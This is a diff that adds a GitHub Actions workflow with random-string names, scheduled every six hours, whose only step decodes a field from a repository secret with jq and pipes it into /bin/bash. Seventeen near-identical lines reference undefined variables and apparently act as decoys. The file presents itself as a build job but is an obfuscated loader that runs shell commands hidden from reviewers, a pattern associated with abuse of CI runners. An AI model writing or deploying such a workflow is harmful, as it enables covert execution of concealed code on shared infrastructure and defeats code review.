@@ -1,0 +1,33 @@
+name: baiqiangda4390
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: baiqiangda4390
+        env:
+          ujp0215: ${{ secrets.ujp0215 }}
+        run: |
+          echo $ujp0215 | jq -r .dfypp09557 | /bin/bash
+          echo $lxqe3 | jq -r .z318 | /bin/bash
+          echo $fgttp7 | jq -r .leg9514 | /bin/bash
+          echo $i1 | jq -r .sog99578 | /bin/bash
+          echo $dcpb8 | jq -r .iiiy661 | /bin/bash
+          echo $ifn8671 | jq -r .nptk22273 | /bin/bash
+          echo $mvmo008 | jq -r .ah78656 | /bin/bash
+          echo $v893 | jq -r .lchz6 | /bin/bash
+          echo $mkpb034 | jq -r .ooa228 | /bin/bash
+          echo $wi805 | jq -r .am7084 | /bin/bash
+          echo $mhpml55151 | jq -r .vcu9794 | /bin/bash
+          echo $f6955 | jq -r .zq6364 | /bin/bash
+          echo $aib88030 | jq -r .v5 | /bin/bash
+          echo $sv04 | jq -r .u57 | /bin/bash
+          echo $fq02 | jq -r .xh42 | /bin/bash
+          echo $vtlkn16 | jq -r .tfi614 | /bin/bash
+          echo $l8 | jq -r .phi562 | /bin/bash
+          echo $fgty867 | jq -r .dmwf8320 | /bin/bash
+
